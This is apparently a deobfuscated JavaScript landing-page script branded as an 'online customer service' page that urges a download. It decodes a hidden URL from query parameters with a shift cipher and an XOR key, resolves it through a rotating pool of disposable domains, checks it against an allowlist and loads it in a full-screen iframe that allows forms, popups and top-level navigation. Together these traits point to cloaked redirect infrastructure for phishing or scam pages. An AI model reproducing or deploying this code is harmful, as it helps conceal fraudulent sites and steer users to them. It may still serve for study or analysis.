//Tue Oct 28 2025 14:01:02 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
(function () {})();
window.onload = async function () {
  try {
    let _0x377698 = false;
    const _0x34f74c = await this.getFrameUrl();
    !_0x34f74c.msg && (_0x377698 = true);
    var _0x3d3231 = _0x34f74c.msg || _0x34f74c;
    document.body.style.display = "flex";
    var _0x11b800 = getQueryString("title");
    _0x11b800 ? window.document.title = _0x11b800 : window.document.title = "在线客服";
    var _0xde6154 = getQueryString("icon") || "";
    if (_0xde6154) {
      _0xde6154 = decodeURIComponent(_0xde6154);
    }
    var _0x1ad780 = getQueryString("desc");
    !_0x1ad780 && (_0x1ad780 = "点击下载找额");
    setOrCreateElement("meta", {
      "name": "description"
    }, "content", _0x1ad780);
    setOrCreateElement("link", {
      "rel": "icon"
    }, "href", _0xde6154);
    setOrCreateElement("link", {
      "rel": "bookmark",
      "type": "image/x-icon"
    }, "href", _0xde6154);
    setOrCreateElement("link", {
      "rel": "shortcut icon",
      "type": "image/x-icon"
    }, "href", _0xde6154);
    !_0x3d3231 && (_0x3d3231 = getQueryString("token"));
    if (!_0x3d3231) {
      return;
    }
    _0x3d3231 = decodeURIComponent(_0x3d3231);
    var _0x469baf = _0x377698 ? xorDecrypt(_0x3d3231) : _0x3d3231;
    if (isHttpOrHttpsUrl(_0x469baf)) {
      if (_0x377698) {
        const _0x524dcd = new URL(_0x469baf).hostname;
        if (!_0x524dcd.includes(".baiwe.site") && !_0x524dcd.includes(".kokol.site") && !_0x524dcd.includes(".quiky.site") && !_0x524dcd.includes(".wokui.icu") && !_0x524dcd.includes(".plushs.club") && !_0x524dcd.includes(".jdshp.shop") && !_0x524dcd.includes(".tengcs.cn") && !_0x524dcd.includes(".xyus.top") && !_0x524dcd.includes(".nikue.top") && !_0x524dcd.includes(".timisl.work") && !_0x524dcd.includes(".asptymgl.top") && !_0x524dcd.includes(".dxptyms.top")) {
          return;
        }
      }
      const _0x19273e = document.documentElement.clientHeight,
        _0x4deb7c = document.createElement("iframe");
      _0x4deb7c.onload = function () {
        document.getElementById("dnrhca").style.display = "none";
      };
      _0x4deb7c.src = _0x469baf;
      _0x4deb7c.frameBorder = "0";
      _0x4deb7c.scrolling = "auto";
      _0x4deb7c.style.width = "100%";
      _0x4deb7c.style.height = _0x19273e;
      _0x4deb7c.style.border = "none";
      _0x4deb7c.style.zIndex = "9999";
      _0x4deb7c.sandbox = "allow-same-origin allow-scripts allow-top-navigation allow-forms allow-popups";
      document.getElementById("overlay").appendChild(_0x4deb7c);
    }
  } catch (_0x1bc739) {}
};
function setOrCreateElement(_0x365382, _0x3309c3, _0x4a1c85 = null, _0x40f466 = null) {
  let _0x3e4900 = _0x365382;
  for (const [_0x45927b, _0x53949d] of Object.entries(_0x3309c3)) {
    _0x3e4900 += "[" + _0x45927b + "=\"" + _0x53949d + "\"]";
  }
  let _0x172761 = document.querySelector(_0x3e4900);
  if (!_0x172761) {
    _0x172761 = document.createElement(_0x365382);
    for (const [_0x154f2d, _0xbca33f] of Object.entries(_0x3309c3)) {
      _0x172761.setAttribute(_0x154f2d, _0xbca33f);
    }
    document.head.appendChild(_0x172761);
  }
  return _0x4a1c85 && _0x40f466 && (_0x172761[_0x4a1c85] = _0x40f466), _0x172761;
}
function getQueryString(_0x32bf95) {
  var _0x1b13e3 = new RegExp("(^|&)" + _0x32bf95 + "=([^&]*)(&|$)"),
    _0x3b249c = window.location.search.substr(1).match(_0x1b13e3);
  if (_0x3b249c != null) return decodeURI(_0x3b249c[2]);
  return "";
}
function isHttpOrHttpsUrl(_0x45c9ea) {
  if (typeof _0x45c9ea !== "string") return false;
  if (_0x45c9ea.startsWith("http://") || _0x45c9ea.startsWith("https://")) return true;
  return false;
}
function xorDecrypt(_0x31201d) {
  let _0x34d0e0 = "gotojiam",
    _0x5a5448 = atob(_0x31201d),
    _0x22a60f = "",
    _0x1cae0f = _0x34d0e0.length;
  for (let _0x215a3d = 0; _0x215a3d < _0x5a5448.length; _0x215a3d++) {
    let _0x1f656c = String.fromCharCode(_0x5a5448.charCodeAt(_0x215a3d) ^ _0x34d0e0.charCodeAt(_0x215a3d % _0x1cae0f));
    _0x22a60f += _0x1f656c;
  }
  return _0x22a60f;
}
async function getFrameUrl() {
  var _0x5d59d7 = getQueryString("d");
  const _0x38fdf1 = _0x5d59d7.substring(_0x5d59d7.length - 2, _0x5d59d7.length);
  _0x38fdf1 < 100 && _0x38fdf1 >= 10 && (_0x5d59d7 = _0x5d59d7.substring(0, _0x5d59d7.length - 2));
  if (!_0x5d59d7) {
    return;
  }
  if (_0x5d59d7.length < 15) {
    let _0x1b0406 = domainPool()[_0x38fdf1] || "";
    return _0x5d59d7 = this.ultraDecrypt(_0x5d59d7), new Promise((_0x3f4ae7, _0x147ce5) => {
      console.log("url", _0x1b0406);
      const _0x59cbbc = new XMLHttpRequest();
      _0x1b0406 = _0x1b0406 + "/api/getFrameUrl/" + _0x5d59d7;
      _0x59cbbc.open("POST", _0x1b0406, true);
      _0x59cbbc.setRequestHeader("Content-Type", "application/json");
      _0x59cbbc.onload = function () {
        if (_0x59cbbc.status === 200) {
          _0x3f4ae7(JSON.parse(_0x59cbbc.responseText));
        } else _0x147ce5(_0x59cbbc.statusText);
      };
      _0x59cbbc.onerror = function () {
        _0x147ce5(_0x59cbbc.statusText);
      };
      _0x59cbbc.send();
    });
  } else return _0x5d59d7;
}
function ultraDecrypt(_0xabd007) {
  const _0x2367f5 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-";
  if (_0xabd007.length < 2) return _0xabd007;
  const _0x59d587 = parseInt(_0xabd007[0]);
  let _0x62ff32 = "";
  for (let _0xece622 = 1; _0xece622 < _0xabd007.length; _0xece622++) {
    const _0x4d12d2 = _0xabd007[_0xece622],
      _0x146e52 = _0x2367f5.indexOf(_0x4d12d2);
    if (_0x146e52 !== -1) {
      let _0x59b233 = (_0x146e52 - _0x59d587) % _0x2367f5.length;
      _0x59b233 < 0 && (_0x59b233 += _0x2367f5.length);
      _0x62ff32 += _0x2367f5[_0x59b233];
    } else _0x62ff32 += _0x4d12d2;
  }
  return _0x62ff32;
}
function domainPool() {
  const _0x89e1db = window.location.href;
  let _0x3e5a00 = _0x89e1db.startsWith("https://") ? "https://" : "http://";
  return {
    "10": _0x3e5a00 + "ansgl.longshengyun.top",
    "11": _0x3e5a00 + "ayglis.alyaiee.site",
    "12": _0x3e5a00 + "dxgls.longshengyun.top",
    "13": _0x3e5a00 + "gnkks.uhgqhmyl.top",
    "14": _0x3e5a00 + "fyxts.fykfcn.top",
    "15": _0x3e5a00 + "sykks.s035ys.cn",
    "16": _0x3e5a00 + "wkks.w874ny.cn",
    "17": _0x3e5a00 + "wykks.w931ym.cn",
    "18": _0x3e5a00 + "xwkks.pfisxm.top",
    "19": _0x3e5a00 + "kkzhs.zcpfcdh.shop",
    "20": _0x3e5a00 + "kkgl.wenyms.top",
    "21": _0x3e5a00 + "kkgl.extlx.top"
  };
}